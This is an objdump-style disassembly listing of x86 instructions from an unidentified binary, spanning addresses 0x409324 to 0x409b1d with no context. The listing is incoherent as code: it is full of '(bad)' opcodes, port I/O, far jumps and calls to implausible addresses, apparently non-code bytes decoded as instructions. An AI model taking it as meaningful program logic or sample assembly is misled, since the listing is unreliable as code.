  409324:	imul   di,WORD PTR [ecx-0x35],0x32
  409329:	iret   
  40932a:	mov    eax,ds:0x9e2efaf5
  40932f:	xlat   BYTE PTR ds:[ebx]
  409330:	jmp    0x9e9fbba6
  409335:	ins    DWORD PTR es:[edi],dx
  409336:	lods   al,BYTE PTR ds:[esi]
  409337:	pop    edi
  409338:	pop    eax
  409339:	data16 ror dh,cl
  40933c:	adc    bh,BYTE PTR [edx+ebp*2]
  40933f:	sub    BYTE PTR [esi],dl
  409341:	repz imul esp,DWORD PTR [ebp-0x524594cd],0x431e290c
  40934c:	lods   al,BYTE PTR ds:[esi]
  40934d:	and    BYTE PTR [ebx-0x5f],0xf
  409351:	mov    WORD PTR [ecx-0x55],?
  409354:	push   ebp
  409355:	repz fbstp TBYTE PTR [eax+eax*1-0x7c]
  40935a:	jb     0x40938e
  40935c:	stos   DWORD PTR es:[edi],eax
  40935d:	arpl   WORD PTR [eax],cx
  40935f:	nop
  409360:	sbb    BYTE PTR [esi],cl
  409362:	sbb    DWORD PTR [ebx-0x7f2f7c3e],0x463cb4b8
  40936c:	pop    edi
  40936d:	scas   al,BYTE PTR es:[edi]
  40936e:	add    dh,0xb2
  409371:	ins    DWORD PTR es:[edi],dx
  409372:	xchg   BYTE PTR [esi+0x1f],bh
  409375:	ficomp DWORD PTR [ebp-0x414710cf]
  40937b:	in     eax,dx
  40937c:	jp     0x409308
  40937e:	dec    edx
  40937f:	ins    BYTE PTR es:[edi],dx
  409380:	cld    
  409381:	mov    ds:0xc7993b6f,eax
  409386:	sar    DWORD PTR [ebx+0x3c9c4163],1
  40938c:	mov    ds:0xa42834ea,al
  409391:	fst    DWORD PTR [ebp+0x4c5b3709]
  409397:	push   ds
  409398:	cs push cs
  40939a:	adc    BYTE PTR [edi+0x3e5faaa3],dh
  4093a0:	shld   DWORD PTR [esi-0x6269011e],ebp,0x5e
  4093a8:	adc    DWORD PTR [ebx+0x5f],eax
  4093ab:	aam    0x2d
  4093ad:	cmc    
  4093ae:	popf   
  4093af:	pop    esp
  4093b0:	and    al,0xd2
  4093b2:	pop    ds
  4093b3:	jo     0x40934b
  4093b5:	xchg   ebx,eax
  4093b6:	push   ds
  4093b7:	stos   BYTE PTR es:[edi],al
  4093b8:	es xor dh,cl
  4093bb:	dec    ecx
  4093bc:	mov    DWORD PTR [esi+0x61ef99ad],ecx
  4093c2:	call   0xb5289083
  4093c7:	scas   al,BYTE PTR es:[edi]
  4093c8:	xchg   esi,eax
  4093c9:	sub    bh,BYTE PTR [ebx-0x77]
  4093cc:	inc    edx
  4093cd:	cmp    DWORD PTR [eax+0x4],esp
  4093d0:	inc    ecx
  4093d1:	inc    edx
  4093d2:	xchg   ebp,eax
  4093d3:	inc    esi
  4093d4:	mov    edi,ds
  4093d6:	mov    ah,0xd3
  4093d8:	inc    ebx
  4093d9:	retf   
  4093da:	(bad)  
  4093db:	mov    fs,WORD PTR [ebp-0x5a]
  4093de:	lahf   
  4093df:	push   es
  4093e0:	cs ss pop eax
  4093e3:	popf   
  4093e4:	(bad)  
  4093e5:	jle    0x40936f
  4093e7:	dec    ebx
  4093e8:	dec    esi
  4093e9:	or     ebp,ecx
  4093eb:	fdiv   QWORD PTR [ebp+0x3f]
  4093ee:	in     eax,0xef
  4093f0:	ret    
  4093f1:	xor    BYTE PTR [ebx],bh
  4093f3:	inc    ebx
  4093f4:	sar    ebp,cl
  4093f6:	clc    
  4093f7:	test   al,0x43
  4093f9:	inc    edx
  4093fa:	inc    edi
  4093fb:	jg     0x40941a
  4093fd:	es mov ecx,0x297fbc75
  409403:	mov    ds:0x7f55c88e,eax
  409408:	cdq    
  409409:	fisttp WORD PTR ss:[eax]
  40940c:	scas   eax,DWORD PTR es:[edi]
  40940d:	dec    ebp
  40940e:	(bad)  
  40940f:	fsub   DWORD PTR [ebp+0xb]
  409412:	mov    esp,0xd25a90f7
  409417:	cdq    
  409418:	je     0x4093a8
  40941a:	ins    BYTE PTR es:[edi],dx
  40941b:	loope  0x4093c4
  40941d:	lods   al,BYTE PTR ds:[esi]
  40941e:	pop    eax
  40941f:	mov    esp,0x1de5bae2
  409424:	inc    ecx
  409425:	call   0xd85b1bce
  40942a:	add    DWORD PTR [esi-0x8f4010e],edx
  409430:	pop    esp
  409431:	sbb    al,BYTE PTR [ebp+edi*8+0x5593a89c]
  409438:	xor    DWORD PTR [ebp-0xa],ecx
  40943b:	addr16 es xchg esp,eax
  40943e:	add    eax,0x7b556914
  409443:	cmp    DWORD PTR [edi],edi
  409445:	add    ebx,esp
  409447:	jns    0x409437
  409449:	add    BYTE PTR [ecx+eiz*8],0x38
  40944d:	or     DWORD PTR [ebx-0x7edacb3f],esp
  409453:	fild   DWORD PTR [ebp+edi*1-0x32]
  409457:	and    DWORD PTR [eax-0x52],ebp
  40945a:	jmp    0x40947d
  40945c:	ss in  eax,0x1e
  40945f:	aas    
  409460:	imul   ecx,DWORD PTR [ecx+0x1c],0x6de62829
  409467:	leave  
  409468:	vpsubsw ymm3,ymm6,YMMWORD PTR [ebx-0x139fd21b]
  409470:	cmp    esi,DWORD PTR [esi+ebx*4-0x14]
  409474:	push   edi
  409475:	jmp    FWORD PTR [ebp-0xe]
  409478:	ja     0x409442
  40947a:	dec    esi
  40947b:	in     al,dx
  40947c:	adc    DWORD PTR [ebx+esi*2],ecx
  40947f:	xor    eax,0x3142494a
  409484:	scas   eax,DWORD PTR es:[edi]
  409485:	lock push ds
  409487:	mov    ebx,0xbc989bc9
  40948c:	push   0x5b
  40948e:	adc    esi,esp
  409490:	imul   ecx,DWORD PTR [edi-0x23180bee],0xffffffca
  409497:	lds    esp,FWORD PTR [ecx-0xd88f6d9]
  40949d:	hlt    
  40949e:	std    
  40949f:	or     ecx,DWORD PTR [esi-0x54b22142]
  4094a5:	fst    DWORD PTR [ecx-0xd10ca09]
  4094ab:	repnz inc edi
  4094ad:	sbb    al,0x96
  4094af:	xor    DWORD PTR [eax],ebx
  4094b1:	pop    ebp
  4094b2:	arpl   WORD PTR [ecx],ax
  4094b4:	retf   
  4094b5:	inc    ebx
  4094b6:	adc    eax,0xb456885c
  4094bb:	loope  0x4094b5
  4094bd:	push   0x7d2ccdbb
  4094c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c3:	cmp    BYTE PTR [ebp+0x7],ch
  4094c6:	jmp    0x4094c5
  4094c8:	ins    DWORD PTR es:[edi],dx
  4094c9:	loopne 0x4094e8
  4094cb:	lds    edx,FWORD PTR [esi+0x6]
  4094ce:	jmp    0xb8d6:0x98c9e598
  4094d5:	cdq    
  4094d6:	mov    edx,0x3b41718c
  4094db:	stc    
  4094dc:	fld    QWORD PTR [edx]
  4094de:	push   ecx
  4094df:	int3   
  4094e0:	fcmovu st,st(3)
  4094e2:	pop    ecx
  4094e3:	das    
  4094e4:	dec    esi
  4094e5:	push   edx
  4094e6:	jmp    0x409513
  4094e8:	and    bl,BYTE PTR ds:0x6b2519a5
  4094ee:	in     al,0x64
  4094f0:	jno    0x40947c
  4094f2:	scas   eax,DWORD PTR es:[edi]
  4094f3:	out    dx,al
  4094f4:	es js  0x4094c4
  4094f7:	xor    dh,cl
  4094f9:	das    
  4094fa:	call   0x3fa2fff2
  4094ff:	test   eax,0xd89f7221
  409504:	aad    0xc7
  409506:	and    cl,BYTE PTR [ebp+0x34a3f71a]
  40950c:	cs mov ch,0x30
  40950f:	out    0xc6,eax
  409511:	mov    edx,0x54d25734
  409516:	aaa    
  409517:	xchg   edi,eax
  409518:	cmp    DWORD PTR [eax+0x31a216eb],0xf876a0da
  409522:	add    al,0xa0
  409524:	dec    esp
  409525:	test   BYTE PTR [edi],bh
  409527:	in     al,dx
  409528:	(bad)  
  409529:	in     eax,0x58
  40952b:	sbb    BYTE PTR [esi],bl
  40952d:	(bad)  
  40952e:	fild   WORD PTR [eax+0x70]
  409531:	mov    WORD PTR [edi],fs
  409533:	jne    0x4095b2
  409535:	aam    0x35
  409537:	jns    0x409524
  409539:	rcl    BYTE PTR [ebx+0x2f6ddfff],0x82
  409540:	xor    bh,BYTE PTR [eax-0x678a121a]
  409546:	test   eax,0xdd883bf9
  40954b:	sahf   
  40954c:	xchg   edi,eax
  40954d:	jb     0x40955a
  40954f:	inc    esi
  409550:	aam    0x89
  409552:	imul   esi,DWORD PTR [edx+0x64],0x775d9ef0
  409559:	mov    dh,0x6e
  40955b:	rcr    BYTE PTR [edx+0xd],cl
  40955e:	das    
  40955f:	setb   BYTE PTR [ebp+0x50]
  409563:	mov    ds:0xe80c1422,eax
  409568:	int    0xb1
  40956a:	in     al,dx
  40956b:	jmp    0xa311:0x276af515
  409572:	daa    
  409573:	push   0x3c
  409575:	jne    0x40953a
  409577:	push   0xffffffbf
  409579:	rcl    esp,0xfe
  40957c:	out    0x66,al
  40957e:	xor    eax,0xd34482a6
  409583:	(bad)  
  409584:	rol    DWORD PTR [ecx],cl
  409586:	int3   
  409587:	cmp    eax,0x7999d9fe
  40958c:	shl    al,0x7e
  40958f:	aad    0xea
  409591:	inc    eax
  409592:	test   al,0x14
  409594:	mov    eax,0xd9974e09
  409599:	les    edi,FWORD PTR [ebx]
  40959b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959c:	dec    ecx
  40959d:	jecxz  0x409542
  40959f:	or     dh,BYTE PTR [edi]
  4095a1:	jb     0x409618
  4095a3:	mov    ebx,0x6a83d920
  4095a8:	cld    
  4095a9:	loope  0x409555
  4095ab:	stos   BYTE PTR es:[edi],al
  4095ac:	out    0x8d,al
  4095ae:	call   FWORD PTR [eax-0x7b]
  4095b1:	into   
  4095b2:	jge    0x40953f
  4095b4:	outs   dx,DWORD PTR ds:[si]
  4095b7:	cmp    al,0xb9
  4095b9:	adc    cl,dh
  4095bb:	adc    bl,BYTE PTR [edx+0x74]
  4095be:	mov    DWORD PTR [esi-0x7d],edx
  4095c1:	mov    bl,0x6b
  4095c3:	shr    DWORD PTR [ebx],cl
  4095c5:	sahf   
  4095c6:	and    esp,DWORD PTR [esi+0x29]
  4095c9:	(bad)  
  4095ca:	jge    0x409647
  4095cc:	les    ebx,FWORD PTR [edi+0x62a39c22]
  4095d2:	sub    al,0xf0
  4095d4:	cmc    
  4095d5:	bound  edi,QWORD PTR [edi-0x78a8d0ad]
  4095db:	lds    esi,FWORD PTR [ebp-0x164a8f82]
  4095e1:	enter  0xed0a,0xd8
  4095e5:	push   es
  4095e6:	aaa    
  4095e7:	in     al,dx
  4095e8:	fdiv   QWORD PTR [edx]
  4095ea:	jae    0x40965a
  4095ec:	ret    0xfc7f
  4095ef:	dec    ebx
  4095f0:	pop    ss
  4095f1:	nop
  4095f2:	cmp    ch,ah
  4095f4:	cmp    bh,BYTE PTR [edi]
  4095f6:	and    BYTE PTR [ebp-0x328ba4eb],0x32
  4095fd:	jmp    0x1d87:0xeeba00cc
  409604:	jae    0x4095c1
  409606:	pop    edx
  409607:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409609:	mov    ecx,0xa753a209
  40960e:	out    0xe2,al
  409610:	je     0x4095f3
  409612:	sbb    ebp,0xffffff92
  409615:	and    eax,0xa1c0a3f5
  40961a:	ds clc 
  40961c:	cmp    BYTE PTR [edx+0x1],dh
  40961f:	outs   dx,BYTE PTR ds:[esi]
  409620:	mov    esp,0x7cbc7aaf
  409625:	push   es
  409626:	cmp    ch,bl
  409628:	aaa    
  409629:	mov    ecx,ecx
  40962b:	pop    ss
  40962c:	rcl    BYTE PTR [esi-0x5b],0xe0
  409630:	adc    DWORD PTR [ecx-0x74e2a0ef],ebx
  409636:	xchg   esi,eax
  409637:	lea    ecx,[esi-0x8ebdcb3]
  40963d:	adc    ah,cl
  40963f:	mov    eax,0xa4898716
  409644:	pop    eax
  409645:	cld    
  409646:	add    al,0x93
  409648:	mov    ds:0x7416dc26,eax
  40964d:	lds    ecx,FWORD PTR [eax]
  40964f:	or     eax,0x63891b8a
  409654:	aas    
  409655:	mov    ah,0x68
  409657:	iret   
  409658:	xchg   ebp,eax
  409659:	ret    
  40965a:	(bad)  
  40965b:	stos   DWORD PTR es:[edi],eax
  40965c:	pop    edi
  40965d:	test   eax,0x4089bc4f
  409662:	push   0x4053f603
  409667:	mov    ecx,DWORD PTR [eax+esi*4]
  40966a:	out    0x39,al
  40966c:	push   cs
  40966d:	dec    ecx
  40966e:	ret    
  40966f:	add    dl,BYTE PTR [ebx+0xf]
  409672:	jns    0x409655
  409674:	xchg   BYTE PTR ds:[ebp+0x6164346],dh
  40967b:	loopne 0x4095fe
  40967d:	scas   eax,DWORD PTR es:[edi]
  40967e:	jae    0x409696
  409680:	ss xchg esi,eax
  409682:	retf   0x8565
  409685:	popf   
  409686:	jne    0x409641
  409688:	mov    esi,0x53129926
  40968d:	xchg   ebp,eax
  40968e:	cmp    esp,eax
  409690:	stos   BYTE PTR es:[edi],al
  409691:	push   eax
  409692:	imul   edi,edx,0x14
  409695:	sub    eax,0x323ecb92
  40969a:	es lahf 
  40969c:	push   ebp
  40969d:	xchg   edi,eax
  40969e:	pop    edi
  40969f:	sbb    bh,BYTE PTR [esp+ebx*8+0x11734e9a]
  4096a6:	nop
  4096a7:	std    
  4096a8:	jae    0x40963a
  4096aa:	dec    ebx
  4096ab:	adc    eax,0x78dbb860
  4096b0:	lods   eax,DWORD PTR ds:[esi]
  4096b1:	ins    BYTE PTR es:[edi],dx
  4096b2:	(bad)  
  4096b3:	pop    ebx
  4096b4:	dec    ebx
  4096b5:	push   esi
  4096b6:	arpl   sp,di
  4096b8:	(bad)  
  4096b9:	daa    
  4096ba:	inc    ecx
  4096bb:	stos   BYTE PTR es:[edi],al
  4096bc:	mov    DWORD PTR [edx+0x2],ebx
  4096bf:	call   0x66f3416
  4096c4:	or     al,cl
  4096c6:	mov    cl,ah
  4096c8:	pop    esp
  4096c9:	lods   eax,DWORD PTR ds:[esi]
  4096ca:	lahf   
  4096cb:	sub    BYTE PTR [eax],al
  4096cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ce:	pop    ecx
  4096cf:	jbe    0x40971c
  4096d1:	adc    DWORD PTR [edi],edi
  4096d3:	inc    bh
  4096d5:	inc    ebx
  4096d6:	sub    al,0xc2
  4096d8:	stos   DWORD PTR es:[edi],eax
  4096d9:	jg     0x409689
  4096db:	and    eax,0xe09aea4e
  4096e0:	inc    edi
  4096e1:	pop    ebx
  4096e2:	xor    ecx,DWORD PTR [eax]
  4096e4:	pop    ebp
  4096e5:	xchg   esp,eax
  4096e6:	sub    ch,BYTE PTR [ebx]
  4096e8:	sub    BYTE PTR [ebp+0x55],ch
  4096eb:	xchg   edi,eax
  4096ec:	lea    eax,[edi+0x7495a7c1]
  4096f2:	mov    ebp,0xbef4dc49
  4096f7:	(bad)  
  4096f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f9:	(bad)  
  4096fa:	jge    0x409727
  4096fc:	jmp    0xdf21f866
  409701:	sbb    ecx,DWORD PTR [eax-0x2ab2eb4b]
  409707:	add    BYTE PTR [eax-0x36],ah
  40970a:	push   edx
  40970b:	lds    ebp,FWORD PTR [bp+di-0x3f67]
  409710:	aas    
  409711:	stos   DWORD PTR es:[edi],eax
  409712:	pop    edi
  409713:	int    0x88
  409715:	jne    0x4096e1
  409717:	add    DWORD PTR [esi+esi*2],edi
  40971a:	dec    ecx
  40971b:	aam    0x8c
  40971d:	inc    ebx
  40971e:	cmp    BYTE PTR [esp+eiz*2+0x74c67885],ah
  409725:	std    
  409726:	and    bh,ch
  409728:	inc    ebx
  409729:	loope  0x40972d
  40972b:	add    al,0x33
  40972d:	or     ebp,DWORD PTR [edi-0x15e3fb40]
  409733:	fld    DWORD PTR [edx]
  409735:	xor    eax,0x491914ff
  40973a:	jmp    0x506076cb
  40973f:	push   ds
  409740:	cdq    
  409741:	add    bh,ah
  409743:	add    ch,BYTE PTR [ebx+0x42155277]
  409749:	adc    eax,0x7c5c6f77
  40974e:	das    
  40974f:	mov    ecx,0xf316d821
  409754:	xchg   ebx,eax
  409755:	imul   esi,DWORD PTR [eax+0x3e043b0c],0xcdfd1837
  40975f:	ds scas eax,DWORD PTR es:[edi]
  409761:	aad    0xbb
  409763:	enter  0x7c78,0xb4
  409767:	jo     0x409756
  409769:	aas    
  40976a:	jne    0x409734
  40976c:	clc    
  40976d:	ja     0x40979a
  40976f:	rcl    DWORD PTR ds:0x1840e001,1
  409775:	mov    edx,0x1c9e2a72
  40977a:	mov    edx,0x775ee32a
  40977f:	and    DWORD PTR [esi+0x326b9739],0xf2062cef
  409789:	les    eax,FWORD PTR [edx-0x644cc908]
  40978f:	js     0x409786
  409791:	pop    ecx
  409792:	add    ebx,eax
  409794:	sub    al,0xc6
  409796:	or     BYTE PTR [ebx+0x50],dl
  409799:	push   edi
  40979a:	das    
  40979b:	outs   dx,DWORD PTR ds:[esi]
  40979c:	xchg   ebp,eax
  40979d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40979e:	dec    esi
  40979f:	sub    ebx,DWORD PTR [esi]
  4097a1:	jg     0x40981c
  4097a3:	aad    0xfa
  4097a5:	mov    dh,0x5f
  4097a7:	or     BYTE PTR [edi-0x7ec6bbf4],0x26
  4097ae:	add    ebx,DWORD PTR ds:0x20f0635a
  4097b4:	mov    ah,0x3f
  4097b6:	xchg   DWORD PTR [edx-0x4],edx
  4097b9:	clc    
  4097ba:	icebp  
  4097bb:	sar    BYTE PTR [edx],1
  4097bd:	test   eax,0x4a2f611d
  4097c2:	sub    eax,0xd6e97cf4
  4097c7:	call   DWORD PTR [esi+0x4b]
  4097ca:	add    ch,BYTE PTR [ebp-0x13e1dc25]
  4097d0:	adc    BYTE PTR [esp+ebx*1],0x41
  4097d4:	in     al,0xce
  4097d6:	dec    ebp
  4097d7:	(bad)  
  4097d8:	aaa    
  4097d9:	push   0xfffffff0
  4097db:	xor    ebx,DWORD PTR [esi+ebx*1-0x5cc666d2]
  4097e2:	sbb    eax,0xded5751c
  4097e7:	fwait
  4097e8:	add    bl,dl
  4097ea:	(bad)  
  4097eb:	aam    0x4f
  4097ed:	dec    esi
  4097ee:	dec    edi
  4097ef:	int    0x23
  4097f1:	scas   eax,DWORD PTR es:[edi]
  4097f2:	scas   eax,DWORD PTR es:[edi]
  4097f3:	sub    edi,esi
  4097f5:	test   eax,0x5fc25752
  4097fa:	addr16 repnz cli 
  4097fd:	xchg   edx,eax
  4097fe:	das    
  4097ff:	mov    al,ds:0x212c67bf
  409804:	stos   BYTE PTR es:[edi],al
  409805:	xor    BYTE PTR [bp+di],bl
  409808:	cdq    
  409809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980b:	jge    0x40986c
  40980d:	or     cl,BYTE PTR [ebx-0x258db738]
  409813:	dec    ebp
  409814:	and    BYTE PTR [esi+0x6e],ah
  409817:	mov    ecx,0x770e22c4
  40981c:	repnz popf 
  40981e:	and    edi,DWORD PTR [eax-0x220bbebd]
  409824:	cmp    al,0xb3
  409826:	jg     0x409825
  409828:	dec    ebp
  409829:	sub    al,0xed
  40982b:	test   al,0x67
  40982d:	pop    esp
  40982e:	and    DWORD PTR [ebp-0x3a8756d4],esp
  409834:	add    al,0xb6
  409836:	xchg   esi,eax
  409837:	lea    ecx,[edx]
  409839:	repz jns 0x4097de
  40983c:	cmp    dh,BYTE PTR [eax+edx*8+0x2f4866fc]
  409843:	and    eax,0x8f77abc8
  409848:	cmp    al,0x53
  40984a:	std    
  40984b:	xor    al,0x9b
  40984d:	pop    edi
  40984e:	sbb    DWORD PTR gs:[ecx+ebx*4-0x6301c6a1],ebx
  409856:	sar    DWORD PTR [ebp+edi*1-0x4b933f55],cl
  40985d:	repz push esp
  40985f:	add    DWORD PTR [ecx-0x404afd50],edi
  409865:	leave  
  409866:	fyl2x  
  409868:	pusha  
  409869:	mov    al,0x8f
  40986b:	adc    ebp,esi
  40986d:	loope  0x4098db
  40986f:	loop   0x409812
  409871:	mov    ds:0x2b4753e9,al
  409876:	xor    al,0x44
  409878:	cli    
  409879:	mov    ch,0x24
  40987b:	daa    
  40987c:	sbb    ah,cl
  40987e:	push   eax
  40987f:	mov    esi,0x7c92e2b3
  409884:	mov    ebp,0xc9caa537
  409889:	inc    ecx
  40988a:	mov    ds:0x9416c5d4,eax
  40988f:	arpl   bp,sp
  409891:	popf   
  409892:	popa   
  409893:	stc    
  409894:	ins    DWORD PTR es:[edi],dx
  409895:	dec    edi
  409896:	iret   
  409897:	call   0x1de327bf
  40989c:	repz aad 0x41
  40989f:	pop    edx
  4098a0:	jg     0x4098ae
  4098a2:	push   ebx
  4098a3:	fistp  DWORD PTR [esi+0x5d4fadca]
  4098a9:	and    al,0x7d
  4098ab:	pmovmskb edx,mm0
  4098ae:	mov    cl,BYTE PTR [eax-0x1bdfa986]
  4098b4:	mov    ebx,0xf6142676
  4098b9:	and    al,ah
  4098bb:	sbb    cl,BYTE PTR [edi-0x7da1694e]
  4098c1:	xchg   esi,eax
  4098c2:	mov    dh,0x25
  4098c4:	pop    es
  4098c5:	jb     0x409917
  4098c7:	jb     0x4098d7
  4098c9:	mov    esi,0x8136b416
  4098ce:	xor    eax,0x32a242ba
  4098d3:	mov    esi,0xfa270c80
  4098d8:	ret    0xfe39
  4098db:	mov    ch,0x10
  4098dd:	mov    al,0x88
  4098df:	fbstp  TBYTE PTR [eax-0x6e38ed4c]
  4098e5:	jnp    0x40994a
  4098e7:	xchg   esp,eax
  4098e8:	pop    ecx
  4098e9:	sub    DWORD PTR [eax],ecx
  4098eb:	mov    bh,0xa5
  4098ed:	adc    DWORD PTR [eax+eiz*4],ebx
  4098f0:	mov    ecx,0x5bfd2174
  4098f5:	fisub  WORD PTR [edx-0xf]
  4098f8:	pushf  
  4098f9:	inc    esp
  4098fa:	jmp    0x42db2acd
  4098ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409900:	aas    
  409901:	inc    ebx
  409902:	aaa    
  409903:	clc    
  409904:	enter  0xa66,0xa7
  409908:	out    0x7f,eax
  40990a:	cs inc esp
  40990c:	dec    edi
  40990d:	scas   al,BYTE PTR es:[edi]
  40990e:	loopne 0x4098b4
  409910:	jb     0x409893
  409912:	test   eax,0xf84f48d3
  409917:	and    BYTE PTR [ebx],0xca
  40991a:	inc    edi
  40991b:	add    BYTE PTR [edx+0x45f244b5],al
  409921:	pop    es
  409922:	sbb    eax,0xb82f915
  409927:	dec    ebp
  409928:	aaa    
  409929:	jns    0x4098f7
  40992b:	into   
  40992c:	cmp    cl,BYTE PTR [ebp+edx*4-0x723d70d9]
  409933:	push   ds
  409934:	mov    eax,0x3c552ff0
  409939:	out    0xc2,al
  40993b:	rol    BYTE PTR [edx+0x21eb3d5b],0xac
  409942:	add    al,0x36
  409944:	es aam 0xa4
  409947:	loopne 0x4099be
  409949:	aam    0x1b
  40994b:	mov    ah,0xde
  40994d:	retf   0xc311
  409950:	mov    edx,0x30701481
  409955:	bound  edx,QWORD PTR [esi+0x77]
  409958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409959:	cmp    al,0x9
  40995b:	dec    eax
  40995c:	stos   BYTE PTR es:[edi],al
  40995d:	imul   eax,DWORD PTR [ebx+0x3a0e4829],0x744dd80b
  409967:	data16 jecxz 0x409958
  40996a:	cmp    BYTE PTR ds:0xe330ad6,bl
  409970:	imul   ebp,DWORD PTR [esi],0x4a
  409973:	les    esp,FWORD PTR [esi+0x9]
  409976:	ror    BYTE PTR ds:[ebx],1
  409979:	ins    DWORD PTR es:[edi],dx
  40997a:	cwde   
  40997b:	pop    es
  40997c:	sub    edi,DWORD PTR [eax+0x62fb4708]
  409982:	pop    edx
  409983:	mov    WORD PTR [edi-0xe],ss
  409986:	xchg   edx,eax
  409987:	fmulp  st(5),st
  409989:	scas   eax,DWORD PTR es:[edi]
  40998a:	in     al,dx
  40998b:	aas    
  40998c:	inc    esi
  40998d:	test   DWORD PTR [ebx+0x4d],edi
  409990:	jmp    0x409925
  409992:	ss daa 
  409994:	sbb    DWORD PTR [ecx],ebx
  409996:	pop    esi
  409997:	dec    eax
  409998:	loope  0x4099cc
  40999a:	add    edi,edi
  40999c:	fs stc 
  40999e:	sub    esi,DWORD PTR [ebp+0x3de6b362]
  4099a4:	push   cs
  4099a5:	cmp    BYTE PTR [eax+0x37],0xa
  4099a9:	daa    
  4099aa:	sar    edx,1
  4099ac:	pop    edi
  4099ad:	out    dx,eax
  4099ae:	push   0x63a816c0
  4099b3:	(bad)  
  4099b4:	mov    ebp,0xf06c09c0
  4099b9:	(bad)  
  4099ba:	pop    esi
  4099bb:	leave  
  4099bc:	lods   al,BYTE PTR ds:[esi]
  4099bd:	mov    BYTE PTR [eax+0x50a5e48a],bh
  4099c3:	mov    ecx,0x5ef5efed
  4099c8:	in     eax,dx
  4099c9:	sub    al,0x8f
  4099cb:	lea    ebp,[ebx]
  4099cd:	mov    esi,0x803f1749
  4099d2:	xlat   BYTE PTR ds:[ebx]
  4099d3:	adc    DWORD PTR [esi],esp
  4099d5:	(bad)  
  4099d6:	fcmovbe st,st(5)
  4099d8:	sub    ah,BYTE PTR [ecx]
  4099da:	add    al,0x15
  4099dc:	fcmovne st,st(2)
  4099de:	test   eax,0xd90a0bb8
  4099e3:	hlt    
  4099e4:	outs   dx,DWORD PTR ds:[esi]
  4099e5:	ds iret 
  4099e7:	xchg   ebx,eax
  4099e8:	sub    eax,0x4ceb2837
  4099ed:	pop    edx
  4099ee:	das    
  4099ef:	jle    0x409a3e
  4099f1:	sbb    ebx,DWORD PTR [esi+0x79]
  4099f4:	sub    DWORD PTR ds:0x7e61b591,0x2832b801
  4099fe:	inc    ecx
  4099ff:	xchg   ebx,eax
  409a00:	adc    dl,BYTE PTR [eiz*1-0x751f840e]
  409a07:	mov    ebp,0xf54f9f3
  409a0c:	call   0x772fa2d3
  409a11:	mov    edx,0x6beb8f82
  409a16:	sub    ecx,edx
  409a18:	loop   0x4099c3
  409a1a:	mov    dl,0xe6
  409a1c:	jmp    0xcc19:0x3c5ff70e
  409a23:	lea    edx,[ebx]
  409a25:	cdq    
  409a26:	hlt    
  409a27:	shr    BYTE PTR [ebp+0x5d5d1da9],0x80
  409a2e:	fldcw  WORD PTR [eax+0x60]
  409a31:	std    
  409a32:	dec    ebx
  409a33:	mov    al,dl
  409a35:	and    BYTE PTR [esp+ebx*8],0x73
  409a39:	mov    dl,ah
  409a3b:	gs cwde 
  409a3d:	xchg   edi,eax
  409a3e:	jnp    0x4099ef
  409a40:	std    
  409a41:	mov    esi,0x60c9bea1
  409a46:	sub    dh,bh
  409a48:	push   es
  409a49:	pop    esi
  409a4a:	sbb    al,0xa9
  409a4c:	add    DWORD PTR [ebp+0x5311d820],ebx
  409a52:	sub    BYTE PTR [ebx+edi*2],0x17
  409a56:	mov    edx,0x17689f83
  409a5b:	sbb    DWORD PTR [esi+0x60],ebx
  409a5e:	jmp    0x74a611c2
  409a63:	mov    eax,0x3472bc01
  409a68:	xor    eax,0x136db2da
  409a6d:	mov    ebp,0x1a628f64
  409a72:	imul   ebx,DWORD PTR [ebp+0xf],0x3f4eea89
  409a79:	ja     0x409aa2
  409a7b:	mov    DWORD PTR [esi+0x365c94cb],ebx
  409a81:	mov    dl,0x4d
  409a83:	mov    bl,0xe4
  409a85:	pop    ebx
  409a86:	push   ss
  409a87:	pop    ds
  409a88:	aad    0xc6
  409a8a:	jbe    0x409ad7
  409a8c:	add    al,0x7a
  409a8e:	xchg   DWORD PTR [edx+0x2766ef5c],eax
  409a94:	adc    al,0x50
  409a96:	xor    esp,DWORD PTR [edi]
  409a98:	jecxz  0x409af1
  409a9a:	pop    esp
  409a9b:	mov    ebx,0x2180eab2
  409aa0:	scas   al,BYTE PTR es:[edi]
  409aa1:	mov    ds:0x7ab3f293,al
  409aa6:	(bad)  
  409aa7:	mov    ebp,0xe7553d4a
  409aac:	sbb    ah,BYTE PTR [ebx+0x4e]
  409aaf:	loop   0x409aa5
  409ab1:	mov    esi,0xb74ac2e5
  409ab6:	aaa    
  409ab7:	xchg   esi,eax
  409ab8:	idiv   ch
  409aba:	mov    dh,0xf2
  409abc:	sub    BYTE PTR [edx],ch
  409abe:	dec    ebp
  409abf:	(bad)  
  409ac0:	aad    0x31
  409ac2:	popa   
  409ac3:	arpl   ax,cx
  409ac5:	jge    0x409a7a
  409ac7:	stos   BYTE PTR es:[edi],al
  409ac8:	in     al,0x97
  409aca:	mov    edi,0x934b1108
  409acf:	(bad)  
  409ad0:	jmp    0x9d19fad7
  409ad5:	mov    ds:0x701b5547,al
  409ada:	pop    ax
  409adc:	sbb    eax,0x596b8f92
  409ae1:	fwait
  409ae2:	nop
  409ae3:	lds    esi,FWORD PTR [edi+0x50141bab]
  409ae9:	inc    ebx
  409aea:	sub    ecx,DWORD PTR [eax+0x4a]
  409aed:	mov    ah,0x44
  409aef:	xchg   edi,eax
  409af0:	sbb    DWORD PTR [edx],esi
  409af2:	cmp    DWORD PTR [edx],ebx
  409af4:	mov    fs,ebp
  409af6:	add    ecx,edx
  409af8:	inc    edx
  409af9:	cli    
  409afa:	aad    0x3
  409afc:	xchg   ebp,eax
  409afd:	jg     0x409b7d
  409aff:	sbb    BYTE PTR [eax],al
  409b01:	pop    edx
  409b02:	ja     0x409ad2
  409b04:	jl     0x409aa3
  409b06:	or     ecx,edi
  409b08:	xchg   edx,eax
  409b09:	xor    DWORD PTR [edi+0x58],0xffffff80
  409b0d:	jno    0x409a95
  409b0f:	sub    esp,DWORD PTR [edi+0x6fbb4f13]
  409b15:	mov    eax,0xb921e875
  409b1a:	sar    ebx,0xb2
  409b1d:	outs   dx,DWORD PTR ds:[esi]
